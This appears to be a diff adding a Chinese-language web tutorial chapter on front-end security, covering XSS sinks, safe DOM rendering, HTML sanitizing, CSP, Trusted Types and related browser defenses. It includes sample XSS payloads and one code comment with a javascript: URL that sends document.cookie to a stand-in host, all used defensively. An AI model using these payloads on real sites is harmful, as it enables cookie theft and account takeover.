@@ -1,0 +1,612 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>第 24 章 · 前端安全 — Web API 实战教程</title>
+<link rel="stylesheet" href="assets/style.css">
+<style>
+  .xss-frame { width: 100%; height: 150px; border: 1px solid var(--line-2); border-radius: 8px; background: #fff; margin-top: 8px; }
+  .alarm { color: var(--red); font-weight: 700; }
+  .safe { color: var(--green); font-weight: 700; }
+</style>
+</head>
+<body data-chapter="24">
+<div id="app">
+<aside id="sidebar"></aside>
+<main>
+
+<span class="chapter-eyebrow">第 24 章 · 补充篇</span>
+<h1>前端安全：XSS、Sanitizer、CSP 与 Trusted Types</h1>
+<p class="lede">
+  回头看看这本书：第 3 章的路由用 <code>innerHTML</code> 渲染页面，第 12 章的组件用 <code>innerHTML</code> 写模板，很多示例都顺手把字符串拼进了 HTML。
+  只要其中有一点点内容来自用户，这就是一个<strong>跨站脚本攻击</strong>（XSS）漏洞。
+  这一章讲清楚 XSS 是怎么发生的，以及浏览器提供的几道防线：安全的 DOM API、HTML 清洗、内容安全策略（CSP）和 Trusted Types。
+</p>
+
+<div class="goals">
+  <h4>本章目标</h4>
+  <ul>
+    <li>理解 XSS 的原理和危害，认识哪些 API 是危险的「接收器」</li>
+    <li>用 <code>textContent</code>、DOM 方法安全地显示用户内容，正确校验链接地址</li>
+    <li>必须渲染 HTML 时，用 Sanitizer API 或 DOMPurify 清洗</li>
+    <li>用 CSP 限制页面能执行哪些脚本，作为第二道防线</li>
+    <li>用 Trusted Types 从源头上锁住危险 API</li>
+    <li>了解 SRI、iframe 沙箱、Cookie 属性、防点击劫持等其他防线</li>
+  </ul>
+</div>
+
+<div id="chapter-toc"></div>
+
+<h2 id="intro">XSS：让你的网站替攻击者执行代码</h2>
+
+<p>
+  浏览器无法区分「网站开发者写的脚本」和「被混进页面的脚本」—— 只要它出现在页面里，就以<strong>这个网站的身份</strong>运行，
+  能读取本站的 localStorage（第 2 章）、调用本站的接口、修改页面内容、记录键盘输入。这就是 XSS 的可怕之处。
+</p>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 270" role="img" aria-label="存储型 XSS 攻击的过程">
+  <rect class="bx-r" x="20" y="30" width="150" height="80" rx="10"/>
+  <text class="ttl on-r" x="95" y="54" text-anchor="middle">① 攻击者</text>
+  <text class="sm" x="95" y="74" text-anchor="middle">在评论框提交：</text>
+  <text class="mono on-r" x="95" y="94" text-anchor="middle" style="font-size:10px">&lt;img src=x onerror=…&gt;</text>
+  <path class="ln-r" d="M172 70 H236" marker-end="url(#ar-r)"/>
+  <rect class="bx" x="240" y="30" width="150" height="80" rx="10"/>
+  <text class="ttl" x="315" y="54" text-anchor="middle">② 服务器</text>
+  <text class="sm" x="315" y="74" text-anchor="middle">原样存入数据库</text>
+  <text class="sm" x="315" y="92" text-anchor="middle">原样返回给所有人</text>
+  <path class="ln" d="M392 70 H456" marker-end="url(#ar)"/>
+  <rect class="bx-a" x="460" y="30" width="280" height="80" rx="10"/>
+  <text class="ttl on-a" x="600" y="54" text-anchor="middle">③ 受害者的浏览器</text>
+  <text class="mono" x="600" y="76" text-anchor="middle" style="font-size:11px">list.innerHTML += comment.text</text>
+  <text class="sm on-r" x="600" y="96" text-anchor="middle">字符串被当作 HTML 解析 → onerror 执行</text>
+
+  <path class="ln-r" d="M600 112 V140" marker-end="url(#ar-r)"/>
+  <rect class="bx-r" x="160" y="144" width="580" height="80" rx="10"/>
+  <text class="ttl on-r" x="450" y="168" text-anchor="middle">④ 恶意脚本以「你的网站」的身份运行</text>
+  <text class="sm" x="450" y="190" text-anchor="middle">读取 localStorage 中的令牌 · 以受害者身份调用接口（发帖、转账、改密码）</text>
+  <text class="sm" x="450" y="208" text-anchor="middle">伪造登录框骗取密码 · 记录键盘输入 · 把自己再传播到更多页面</text>
+
+  <text class="sm" x="20" y="252">三种来源：存储型（存进数据库，如上图）· 反射型（藏在 URL 参数里）· DOM 型（前端代码自己把 location.hash 等内容写进了 HTML）</text>
+</svg>
+<figcaption>图 24-1　一条恶意评论，就能在每个浏览这条评论的用户的浏览器里执行代码</figcaption>
+</figure>
+
+<div class="box key">
+  <div class="t">&#128273; 根本原因只有一个</div>
+  <p>
+    <strong>把「数据」当成了「代码」</strong>。用户输入的是一段文本，却被交给了一个会把字符串解析成 HTML 或 JavaScript 的 API。
+    所以防御的核心也只有一句话：<strong>数据就用处理数据的 API，永远不要让它经过「解析」这一步</strong>。
+  </p>
+</div>
+
+<h2 id="r24-1"><span class="rn">24.1</span>认识危险的接收器</h2>
+
+<p class="prob">你想知道哪些 API 会把字符串当作代码来解析，写代码时要格外小心。</p>
+
+<p>会把字符串「解析」成 HTML 或代码的地方，在安全领域叫做<strong>接收器</strong>（sink）。数据流入接收器之前，必须确认它是安全的：</p>
+
+<div class="tw">
+<table>
+  <tr><th>危险的接收器</th><th>风险</th><th>安全的替代</th></tr>
+  <tr><td><code>el.innerHTML = str</code>、<code>outerHTML</code></td><td>解析为 HTML，事件属性（<code>onerror</code>）会执行</td><td><code>el.textContent = str</code></td></tr>
+  <tr><td><code>el.insertAdjacentHTML(pos, str)</code></td><td>同上</td><td><code>el.insertAdjacentText()</code>、<code>el.append(节点)</code></td></tr>
+  <tr><td><code>document.write(str)</code></td><td>同上，还会阻塞解析</td><td>DOM 方法</td></tr>
+  <tr><td><code>eval(str)</code>、<code>new Function(str)</code></td><td>直接执行代码</td><td><code>JSON.parse</code>、查表</td></tr>
+  <tr><td><code>setTimeout('字符串', ms)</code></td><td>字符串会被当作代码执行</td><td>传函数：<code>setTimeout(() =&gt; …, ms)</code></td></tr>
+  <tr><td><code>a.href = str</code>、<code>iframe.src = str</code>、<code>location = str</code></td><td><code>javascript:</code> 开头的 URL 会执行代码</td><td>先用 <code>new URL</code> 校验协议（见 24.2）</td></tr>
+  <tr><td><code>el.setAttribute('onclick', str)</code></td><td>事件属性就是代码</td><td><code>addEventListener</code></td></tr>
+  <tr><td><code>script.src = str</code>、<code>script.textContent = str</code></td><td>加载或执行任意脚本</td><td>只使用你自己控制的固定地址</td></tr>
+</table>
+</div>
+
+<div class="box warn">
+  <div class="t">&#9888; 一个常见的误解：「script 标签不会执行，所以 innerHTML 是安全的」</div>
+  <p>
+    通过 <code>innerHTML</code> 插入的 <code>&lt;script&gt;</code> 标签确实不会执行，但这根本拦不住攻击者：
+    <code>&lt;img src=x onerror=攻击代码&gt;</code>、<code>&lt;svg onload=…&gt;</code>、<code>&lt;a href="javascript:…"&gt;</code> 等写法数不胜数。
+    不要试图用正则表达式「过滤掉危险标签」，HTML 的解析规则复杂到你几乎不可能写对。
+  </p>
+</div>
+
+<h2 id="r24-2"><span class="rn">24.2</span>安全地显示用户内容</h2>
+
+<p class="prob">评论、昵称、搜索词这些来自用户的内容要显示在页面上。</p>
+
+<div class="vs">
+  <div class="old"><div class="h">✗ 拼接 HTML 字符串</div>
+    <div class="code" data-lang="js">
+<script type="text/plain">
+function renderComment(comment) {
+  list.innerHTML += `
+    <li class="comment">
+      <b>${comment.author}</b>
+      <p>${comment.text}</p>
+    </li>`;
+}
+// author 或 text 里只要有 HTML，就会被解析
+</script>
+    </div>
+  </div>
+  <div class="new"><div class="h">✓ 用 DOM 方法构建</div>
+    <div class="code" data-lang="js">
+<script type="text/plain">
+function renderComment(comment) {
+  const li = document.createElement('li');
+  li.className = 'comment';
+  const author = document.createElement('b');
+  author.textContent = comment.author;  // 纯文本
+  const text = document.createElement('p');
+  text.textContent = comment.text;      // 纯文本
+  li.append(author, text);
+  list.append(li);
+}
+</script>
+    </div>
+  </div>
+</div>
+
+<p>
+  <code>textContent</code> 把内容当作<strong>纯文本</strong>：<code>&lt;img onerror=…&gt;</code> 会原样显示成这几个字符，而不会变成一张图片。
+  结构比较复杂时，可以用第 12 章的 <code>&lt;template&gt;</code> 写好固定的结构，克隆之后只用 <code>textContent</code> 填充数据：
+</p>
+
+<div class="code" data-lang="js">
+<script type="text/plain">
+// <template id="comment-tpl"><li class="comment"><b></b><p></p></li></template>
+const tpl = document.querySelector('#comment-tpl');
+
+function renderComment(comment) {
+  const node = tpl.content.cloneNode(true);
+  node.querySelector('b').textContent = comment.author;
+  node.querySelector('p').textContent = comment.text;
+  list.append(node);
+}
+</script>
+</div>
+
+<h3>链接地址也要检查</h3>
+
+<p>用户可以填写「个人主页」链接？<code>textContent</code> 帮不了你，因为危险在于 <code>href</code> 的值本身：</p>
+
+<div class="code" data-lang="js">
+<script type="text/plain">
+link.href = user.website;   // 如果 website 是 "javascript:fetch('//evil.example?c='+document.cookie)" 呢？
+
+// 用第 3 章的 URL 解析，只允许 http / https
+function safeUrl(input) {
+  const url = URL.parse(input, location.href);   // 解析失败返回 null
+  return url && ['http:', 'https:'].includes(url.protocol) ? url.href : null;
+}
+
+const href = safeUrl(user.website);
+if (href) {
+  link.href = href;
+  link.rel = 'noopener noreferrer ugc';          // 用户提供的外链：见 24.6
+} else {
+  link.removeAttribute('href');
+}
+</script>
+</div>
+
+<div class="box tip">
+  <div class="t">&#128161; 框架帮你做了什么，没做什么</div>
+  <p>
+    React、Vue、Svelte 等框架在渲染 <code>{text}</code> 时默认会转义，所以大多数情况下是安全的。
+    但它们都留有「后门」：React 的 <code>dangerouslySetInnerHTML</code>、Vue 的 <code>v-html</code>、Svelte 的 <code>{@html}</code>，
+    以及把用户输入绑定到 <code>href</code> 属性 —— 这些地方仍然需要你自己负责。
+  </p>
+</div>
+
+<h2 id="r24-3"><span class="rn">24.3</span>必须渲染 HTML 时：清洗</h2>
+
+<p class="prob">你的应用确实需要显示用户写的富文本（比如富文本编辑器的内容、Markdown 转换出的 HTML），不能全部当作纯文本。</p>
+
+<p>
+  这时要对 HTML 做<strong>清洗</strong>（sanitize）：解析 HTML，只保留允许的标签和属性（<code>&lt;b&gt;</code>、<code>&lt;a href&gt;</code>、<code>&lt;img src&gt;</code>……），
+  删掉所有脚本、事件属性和危险的 URL。
+</p>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 200" role="img" aria-label="HTML 清洗前后的对比">
+  <rect class="bx-r" x="20" y="30" width="300" height="130" rx="10"/>
+  <text class="ttl on-r" x="170" y="54" text-anchor="middle">用户提交的 HTML</text>
+  <text class="mono" x="36" y="82" style="font-size:11px">&lt;p&gt;你好 &lt;b&gt;世界&lt;/b&gt;&lt;/p&gt;</text>
+  <text class="mono on-r" x="36" y="102" style="font-size:11px">&lt;img src=x onerror="steal()"&gt;</text>
+  <text class="mono on-r" x="36" y="122" style="font-size:11px">&lt;a href="javascript:steal()"&gt;点我&lt;/a&gt;</text>
+  <text class="mono on-r" x="36" y="142" style="font-size:11px">&lt;script&gt;steal()&lt;/script&gt;</text>
+  <path class="ln-a" d="M322 95 H420" marker-end="url(#ar-a)"/>
+  <text class="mono on-a" x="371" y="86" text-anchor="middle" style="font-size:11px">sanitize</text>
+  <rect class="bx-g" x="424" y="30" width="316" height="130" rx="10"/>
+  <text class="ttl on-g" x="582" y="54" text-anchor="middle">清洗后</text>
+  <text class="mono" x="440" y="82" style="font-size:11px">&lt;p&gt;你好 &lt;b&gt;世界&lt;/b&gt;&lt;/p&gt;</text>
+  <text class="mono" x="440" y="102" style="font-size:11px">&lt;img src="x"&gt;　 ← onerror 被删除</text>
+  <text class="mono" x="440" y="122" style="font-size:11px">&lt;a&gt;点我&lt;/a&gt;　 ← 危险的 href 被删除</text>
+  <text class="sm" x="440" y="142">script 整个被删除</text>
+  <text class="sm" x="380" y="190" text-anchor="middle">格式保留，所有可执行的部分都消失了</text>
+</svg>
+<figcaption>图 24-2　清洗 = 保留格式，去掉代码</figcaption>
+</figure>
+
+<h3>浏览器内置的 Sanitizer API</h3>
+
+<div class="code" data-lang="js">
+<script type="text/plain">
+// setHTML：解析 + 清洗 + 插入，一步完成。默认配置会移除脚本和所有事件属性
+element.setHTML(userHtml);
+
+// 进一步限制允许的元素
+element.setHTML(userHtml, {
+  sanitizer: { elements: ['p', 'b', 'i', 'a', 'ul', 'li'] }
+});
+</script>
+</div>
+
+<div class="box new">
+  <div class="t">&#10024; Sanitizer API 的现状</div>
+  <p>
+    Sanitizer API 经过多年讨论后重新设计，<code>Element.setHTML()</code> 已开始在浏览器中正式发布，但截至 2026 年仍未在所有主流浏览器中可用。<span class="bl limited">有限支持</span>
+    使用前请检测 <code>'setHTML' in Element.prototype</code>，不支持时退回 DOMPurify。
+    （与之对应的 <code>setHTMLUnsafe()</code> <strong>不做清洗</strong>，它存在的意义是支持第 12 章的声明式 Shadow DOM，千万别用它处理用户内容。）
+  </p>
+</div>
+
+<h3>成熟方案：DOMPurify</h3>
+
+<p>
+  <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> 由安全公司 Cure53 维护，是目前最广泛使用的 HTML 清洗库，也是很多框架文档推荐的方案：
+</p>
+
+<div class="code" data-lang="js">
+<script type="text/plain">
+import DOMPurify from 'dompurify';
+
+element.innerHTML = DOMPurify.sanitize(userHtml);
+
+// 限制允许的标签和属性
+DOMPurify.sanitize(userHtml, { ALLOWED_TAGS: ['p', 'b', 'i', 'a'], ALLOWED_ATTR: ['href'] });
+
+// 渐进增强的写法
+if ('setHTML' in Element.prototype) element.setHTML(userHtml);
+else element.innerHTML = DOMPurify.sanitize(userHtml);
+</script>
+</div>
+
+<div class="box warn">
+  <div class="t">&#9888; 清洗之后就不要再改了</div>
+  <p>
+    清洗必须是插入 DOM 之前的<strong>最后一步</strong>。清洗之后如果又做了字符串替换、拼接，或者在服务器清洗后前端再解码一次，都可能「复活」危险内容。
+    另外，服务器端也要对存储的内容做校验，不能只依赖前端。
+  </p>
+</div>
+
+<div class="demo">
+  <div class="h">试一试：同一段恶意输入，四种渲染方式（在隔离的沙箱 iframe 中运行，无法影响本页）</div>
+  <div class="b">
+    <textarea id="xss-input" rows="3" style="width:100%;font-family:var(--mono);font-size:13px">&lt;p&gt;你好 &lt;b&gt;世界&lt;/b&gt;&lt;/p&gt;&lt;img src=x onerror="document.body.insertAdjacentHTML('beforeend','&lt;p style=color:red&gt;⚠ 注入的脚本执行了！它可以读取这个页面的一切。&lt;/p&gt;');parent.postMessage('xss','*')"&gt;</textarea>
+    <div class="row">
+      <button data-mode="innerHTML">innerHTML（危险）</button>
+      <button data-mode="textContent">textContent</button>
+      <button data-mode="dompurify">DOMPurify.sanitize</button>
+      <button data-mode="setHTML">setHTML（Sanitizer API）</button>
+    </div>
+    <div id="xss-status" class="hint">点击按钮查看结果</div>
+    <iframe class="xss-frame" id="xss-frame" sandbox="allow-scripts" title="XSS 演示沙箱"></iframe>
+  </div>
+</div>
+
+<h2 id="r24-4"><span class="rn">24.4</span>内容安全策略（CSP）：第二道防线</h2>
+
+<p class="prob">代码量大了，难免有某处疏忽用了 innerHTML。你希望即使出现漏洞，注入的脚本也执行不了。</p>
+
+<p>
+  <strong>CSP</strong>（Content Security Policy）由服务器通过响应头告诉浏览器：「这个页面只允许执行这些来源的脚本」。
+  不符合规则的脚本 —— 包括注入的内联脚本和 <code>onerror</code> 这样的事件属性 —— 都会被浏览器拒绝执行。<span class="bl wide">Baseline 广泛可用</span>
+</p>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 250" role="img" aria-label="CSP 如何拦截注入的脚本">
+  <rect class="bx-b" x="20" y="20" width="720" height="40" rx="8"/>
+  <text class="mono on-b" x="380" y="45" text-anchor="middle" style="font-size:11.5px">Content-Security-Policy: script-src 'nonce-R4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'</text>
+
+  <rect class="bx-g" x="20" y="84" width="230" height="110" rx="10"/>
+  <text class="ttl on-g" x="135" y="108" text-anchor="middle">✓ 你的脚本</text>
+  <text class="mono" x="135" y="132" text-anchor="middle" style="font-size:10.5px">&lt;script nonce="R4nd0m"</text>
+  <text class="mono" x="135" y="150" text-anchor="middle" style="font-size:10.5px">src="/app.js"&gt;</text>
+  <text class="sm" x="135" y="176" text-anchor="middle">带着正确的 nonce，放行</text>
+
+  <rect class="bx-g" x="265" y="84" width="230" height="110" rx="10"/>
+  <text class="ttl on-g" x="380" y="108" text-anchor="middle">✓ 它加载的脚本</text>
+  <text class="sm" x="380" y="134" text-anchor="middle">app.js 动态创建的 &lt;script&gt;</text>
+  <text class="sm" x="380" y="152" text-anchor="middle">（'strict-dynamic'：信任传递）</text>
+  <text class="sm" x="380" y="176" text-anchor="middle">放行</text>
+
+  <rect class="bx-r" x="510" y="84" width="230" height="110" rx="10"/>
+  <text class="ttl on-r" x="625" y="108" text-anchor="middle">✗ 注入的代码</text>
+  <text class="mono" x="625" y="132" text-anchor="middle" style="font-size:10.5px">&lt;img onerror=…&gt;</text>
+  <text class="mono" x="625" y="150" text-anchor="middle" style="font-size:10.5px">&lt;script&gt;…&lt;/script&gt;</text>
+  <text class="sm" x="625" y="176" text-anchor="middle">没有 nonce，拦截并报告</text>
+
+  <text class="sm" x="380" y="222" text-anchor="middle">nonce 是服务器每次响应都重新生成的随机值，攻击者无法预知，所以注入的脚本不可能带着正确的 nonce</text>
+  <text class="sm" x="380" y="240" text-anchor="middle">CSP 不能修复漏洞，但能让大多数 XSS 漏洞变得无法利用</text>
+</svg>
+<figcaption>图 24-3　基于 nonce 的「严格 CSP」</figcaption>
+</figure>
+
+<div class="tw">
+<table>
+  <tr><th>指令</th><th>作用</th></tr>
+  <tr><td><code>script-src</code></td><td>允许执行哪些脚本。推荐 <code>'nonce-随机值' 'strict-dynamic'</code>；避免 <code>'unsafe-inline'</code> 和 <code>'unsafe-eval'</code></td></tr>
+  <tr><td><code>object-src 'none'</code></td><td>禁用 <code>&lt;object&gt;</code> / <code>&lt;embed&gt;</code> 插件</td></tr>
+  <tr><td><code>base-uri 'none'</code></td><td>防止注入 <code>&lt;base&gt;</code> 标签改变所有相对地址</td></tr>
+  <tr><td><code>default-src</code> / <code>img-src</code> / <code>connect-src</code> …</td><td>限制图片、fetch 请求等其他资源的来源</td></tr>
+  <tr><td><code>frame-ancestors 'none'</code></td><td>禁止别的网站用 iframe 嵌入你的页面（防点击劫持，见 24.6）</td></tr>
+  <tr><td><code>report-to</code></td><td>违规时向指定地址发送报告</td></tr>
+</table>
+</div>
+
+<h3>先观察，再拦截</h3>
+
+<p>
+  直接上线一个严格的 CSP，很可能误伤你自己的内联脚本或第三方统计代码。稳妥的做法是先用 <code>Content-Security-Policy-Report-Only</code>：
+  浏览器只报告违规、不真正拦截。收集一段时间报告、修正问题后，再切换为正式的 CSP。页面上也可以监听违规事件：
+</p>
+
+<div class="code" data-lang="js">
+<script type="text/plain">
+document.addEventListener('securitypolicyviolation', event => {
+  console.warn('CSP 违规：', event.violatedDirective, event.blockedURI, event.sourceFile, event.lineNumber);
+  navigator.sendBeacon('/csp-report', JSON.stringify({   // 第 4 章的 Beacon
+    directive: event.violatedDirective,
+    blocked: event.blockedURI
+  }));
+});
+</script>
+</div>
+
+<div class="box note">
+  <div class="t">&#9432; 没法设置响应头？用 meta 标签</div>
+  <p>
+    GitHub Pages 这类静态托管不能自定义响应头，这时可以在 HTML 的 <code>&lt;head&gt;</code> 最前面写
+    <code>&lt;meta http-equiv="Content-Security-Policy" content="…"&gt;</code>。
+    不过 meta 方式<strong>不支持</strong> <code>frame-ancestors</code>、<code>report-to</code> 和 Report-Only 模式，也只对它之后加载的内容生效。
+    （本教程站点托管在 GitHub Pages 上，并且页面中大量使用内联演示脚本，所以只在下面的沙箱演示中使用了 CSP。）
+  </p>
+</div>
+
+<div class="demo">
+  <div class="h">试一试：同样的注入，加上 CSP 之后</div>
+  <div class="b">
+    <p style="margin-top:0">下面的沙箱页面带有 <code>&lt;meta http-equiv="Content-Security-Policy" content="script-src 'nonce-demo'"&gt;</code>，并包含和上一个演示相同的注入代码：</p>
+    <div class="row"><button id="csp-run">加载带 CSP 的页面</button></div>
+    <div id="csp-status" class="hint"></div>
+    <iframe class="xss-frame" id="csp-frame" sandbox="allow-scripts" title="CSP 演示沙箱"></iframe>
+  </div>
+</div>
+
+<h2 id="r24-5"><span class="rn">24.5</span>Trusted Types：从源头锁住危险 API</h2>
+
+<p class="prob">项目很大、开发者很多，你希望「往 innerHTML 里塞一个普通字符串」这件事本身就直接报错，逼着所有人走安全的路径。</p>
+
+<p>
+  <strong>Trusted Types</strong> 是 CSP 的一个扩展。开启后，24.1 节表格里的那些危险接收器<strong>不再接受普通字符串</strong>，
+  只接受经过你定义的「策略」处理过的特殊对象（<code>TrustedHTML</code>、<code>TrustedScriptURL</code>……）：
+</p>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 210" role="img" aria-label="Trusted Types 让危险接收器只接受经过策略处理的值">
+  <rect class="bx-b" x="20" y="16" width="720" height="34" rx="8"/>
+  <text class="mono on-b" x="380" y="38" text-anchor="middle" style="font-size:11.5px">Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-sanitize</text>
+
+  <rect class="bx" x="20" y="80" width="180" height="46" rx="8"/><text class="mono" x="110" y="108" text-anchor="middle" style="font-size:11px">'&lt;img onerror=…&gt;'</text>
+  <path class="ln-r" d="M202 103 H540" marker-end="url(#ar-r)"/>
+  <text class="sm on-r" x="370" y="96" text-anchor="middle">直接赋值给 innerHTML → 抛出 TypeError，页面不会被注入</text>
+
+  <rect class="bx" x="20" y="146" width="180" height="46" rx="8"/><text class="mono" x="110" y="174" text-anchor="middle" style="font-size:11px">用户输入的 HTML</text>
+  <path class="ln" d="M202 169 H256" marker-end="url(#ar)"/>
+  <rect class="bx-a" x="260" y="146" width="200" height="46" rx="8"/>
+  <text class="mono on-a" x="360" y="166" text-anchor="middle" style="font-size:11px">policy.createHTML()</text>
+  <text class="sm" x="360" y="184" text-anchor="middle">唯一的入口：在这里清洗</text>
+  <path class="ln-g" d="M462 169 H540" marker-end="url(#ar-g)"/>
+  <text class="sm on-g" x="501" y="160" text-anchor="middle">TrustedHTML</text>
+  <rect class="bx-g" x="544" y="80" width="196" height="112" rx="10"/>
+  <text class="mono on-g" x="642" y="120" text-anchor="middle">el.innerHTML</text>
+  <text class="sm" x="642" y="144" text-anchor="middle">只接受 Trusted 对象</text>
+  <text class="sm" x="642" y="162" text-anchor="middle">安全审查只需要看策略</text>
+</svg>
+<figcaption>图 24-4　所有 HTML 都必须经过同一个受控的入口</figcaption>
+</figure>
+
+<div class="code" data-lang="js">
+<script type="text/plain">
+// 定义一个策略：所有 HTML 都必须经过 DOMPurify
+const policy = trustedTypes.createPolicy('app-sanitize', {
+  createHTML: input => DOMPurify.sanitize(input)
+});
+
+el.innerHTML = userHtml;                      // ✗ TypeError：需要 TrustedHTML
+el.innerHTML = policy.createHTML(userHtml);   // ✓ 经过清洗
+
+// 渐进增强：不支持 Trusted Types 的浏览器里，policy 可以用一个普通对象代替
+</script>
+</div>
+
+<p>
+  它的价值在于把「安全」从「每个开发者每次都记得」变成了「不这样写就跑不起来」。
+  代码审查时，只需要检查少数几个策略函数，而不是全项目几百处 <code>innerHTML</code>。
+  Chromium 很早就支持 Trusted Types，其他浏览器近年也在陆续实现，使用前请查阅 caniuse。<span class="bl limited">支持情况在变化</span>
+  不支持的浏览器会忽略这条 CSP 指令，不会造成功能问题。
+</p>
+
+<h2 id="r24-6"><span class="rn">24.6</span>其他防线</h2>
+
+<p class="prob">除了 XSS，前端还有哪些常见的安全问题，浏览器又提供了哪些开关？</p>
+
+<h3>子资源完整性（SRI）</h3>
+
+<p>
+  从 CDN 加载第三方脚本时，如果 CDN 被入侵（第 19 章提到的 polyfill.io 事件），你的网站就会执行被篡改的代码。
+  <code>integrity</code> 属性写上文件内容的哈希（第 23 章），浏览器下载后会校验，不匹配就拒绝执行。本页的演示正是这样加载 DOMPurify 的：
+</p>
+
+<div class="code" data-lang="html" data-file="本页实际使用的标签">
+<script type="text/plain">
+<script
+  src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.4.16/purify.min.js"
+  integrity="sha512-flQmhkXNRQ3iUfvtdCobtpMjCb6kE+zLnTiAulAQJ3WykVfy84JvCMOo6vhwWXHTXjR25h9Zj+LyGFRWKjRoag=="
+  crossorigin="anonymous"
+  referrerpolicy="no-referrer"><\/script>
+</script>
+</div>
+
+<h3>iframe 沙箱</h3>
+
+<p>
+  嵌入不可信的内容（用户上传的 HTML、第三方小部件）时，给 iframe 加上 <code>sandbox</code> 属性。它默认禁止脚本、表单、弹窗、顶层跳转，并把内容放进一个独立的「不透明源」；
+  需要什么能力再用 <code>allow-scripts</code> 等值逐项开放。本章的两个演示都运行在 <code>sandbox="allow-scripts"</code> 的 iframe 中，所以注入的脚本碰不到本页。
+</p>
+
+<div class="box warn">
+  <div class="t">&#9888; 不要同时开启 allow-scripts 和 allow-same-origin</div>
+  <p>对于同源的内容，两者同时开启时，iframe 里的脚本可以直接移除自己身上的 sandbox 属性，沙箱等于没有。</p>
+</div>
+
+<h3>其他要点</h3>
+
+<div class="tw">
+<table>
+  <tr><th>问题</th><th>防护</th></tr>
+  <tr><td>新窗口通过 <code>window.opener</code> 把你的页面跳转到钓鱼网站</td><td><code>target="_blank"</code> 现在默认带 <code>noopener</code> <span class="bl wide">广泛可用</span>；给用户提供的链接加 <code>rel="noopener noreferrer ugc"</code></td></tr>
+  <tr><td>Cookie 被 XSS 读取、被跨站请求携带</td><td>服务器设置 <code>HttpOnly</code>（JS 读不到）、<code>Secure</code>（只走 HTTPS）、<code>SameSite=Lax</code> 或 <code>Strict</code>（跨站请求不携带）。Chromium 默认按 Lax 处理，其他浏览器不一定，务必显式设置</td></tr>
+  <tr><td>令牌存在 localStorage，XSS 后被偷走</td><td>第 2 章说过：localStorage 对页面上的所有 JS 可见。敏感的会话凭证优先使用 HttpOnly Cookie</td></tr>
+  <tr><td>点击劫持：你的页面被透明地嵌入恶意网站，诱导用户点击</td><td>响应头 <code>Content-Security-Policy: frame-ancestors 'none'</code>（旧方案 <code>X-Frame-Options: DENY</code>）</td></tr>
+  <tr><td>第三方脚本滥用摄像头、定位等权限</td><td><code>Permissions-Policy: camera=(), geolocation=(self)</code>，iframe 上用 <code>allow</code> 属性按需授权</td></tr>
+  <tr><td>中间人篡改页面</td><td>全站 HTTPS + <code>Strict-Transport-Security</code>（HSTS）响应头</td></tr>
+  <tr><td>用 <code>postMessage</code> 通信时收到伪造的消息</td><td>接收时检查 <code>event.origin</code>，发送时指定目标源而不是 <code>'*'</code></td></tr>
+</table>
+</div>
+
+<h2 id="checklist">安全清单</h2>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 250" role="img" aria-label="前端安全的层层防线">
+  <rect class="bx-g" x="20" y="16" width="720" height="40" rx="8"/>
+  <text class="lbl on-g" x="380" y="41" text-anchor="middle">第 1 层 · 写对代码：textContent / DOM 方法 · 校验 URL 协议 · 不用 eval 与字符串定时器</text>
+  <rect class="bx-b" x="60" y="66" width="640" height="40" rx="8"/>
+  <text class="lbl on-b" x="380" y="91" text-anchor="middle">第 2 层 · 必须用 HTML 时清洗：setHTML / DOMPurify</text>
+  <rect class="bx-p" x="100" y="116" width="560" height="40" rx="8"/>
+  <text class="lbl on-p" x="380" y="141" text-anchor="middle">第 3 层 · 强制约束：Trusted Types</text>
+  <rect class="bx-a" x="140" y="166" width="480" height="40" rx="8"/>
+  <text class="lbl on-a" x="380" y="191" text-anchor="middle">第 4 层 · 兜底：严格 CSP · SRI · 沙箱</text>
+  <rect class="bx" x="180" y="216" width="400" height="30" rx="8"/>
+  <text class="sm" x="380" y="236" text-anchor="middle">减少损失：HttpOnly Cookie · 最小权限</text>
+</svg>
+<figcaption>图 24-5　纵深防御：每一层都可能失守，所以要有下一层</figcaption>
+</figure>
+
+<ul>
+  <li>全局搜索 <code>innerHTML</code>、<code>outerHTML</code>、<code>insertAdjacentHTML</code>、<code>document.write</code>、<code>eval</code>，逐一确认数据来源。</li>
+  <li>所有来自用户、URL、第三方接口、<code>postMessage</code> 的数据都视为不可信。</li>
+  <li>外链只允许 <code>http:</code> / <code>https:</code> 协议。</li>
+  <li>部署严格 CSP（先 Report-Only），能开 Trusted Types 就开。</li>
+  <li>第三方脚本尽量自托管；从 CDN 加载时加 <code>integrity</code>。</li>
+  <li>会话凭证使用 <code>HttpOnly; Secure; SameSite</code> 的 Cookie。</li>
+  <li>前端的一切校验都能被绕过：服务器端必须再次校验和编码。</li>
+</ul>
+
+<h2 id="summary">小结</h2>
+
+<ul>
+  <li>XSS 的本质是数据被当作代码解析；注入的脚本拥有与你的网站相同的权限。</li>
+  <li><code>innerHTML</code> 等「接收器」会解析字符串；显示用户内容用 <code>textContent</code> 和 DOM 方法，链接先用 <code>URL</code> 校验协议。</li>
+  <li>必须渲染 HTML 时清洗：浏览器的 <code>setHTML()</code>（逐步普及中）或 DOMPurify。</li>
+  <li>CSP 用 nonce + <code>'strict-dynamic'</code> 限制可执行的脚本，先 Report-Only 观察；Trusted Types 让危险接收器只接受经过策略的值。</li>
+  <li>SRI、iframe 沙箱、Cookie 属性、<code>frame-ancestors</code>、Permissions-Policy 构成其余的防线。</li>
+</ul>
+
+<div class="exercise">
+  <h3>动手练习</h3>
+  <ol>
+    <li>回到第 3 章的前端路由，找出其中的 <code>innerHTML</code>，思考：如果路由内容来自服务器接口，会有什么风险？改写成安全的版本。</li>
+    <li>做一个「评论区」：评论支持加粗、斜体和链接。用 <code>setHTML</code>（不支持时用 DOMPurify）渲染，并尝试各种 XSS 写法验证它们都被清除了。</li>
+    <li>在本地用 <code>npx serve</code> 或任意静态服务器，给一个页面加上 <code>Content-Security-Policy-Report-Only</code> 响应头，打开控制台观察违规报告，逐步修正直到零违规。</li>
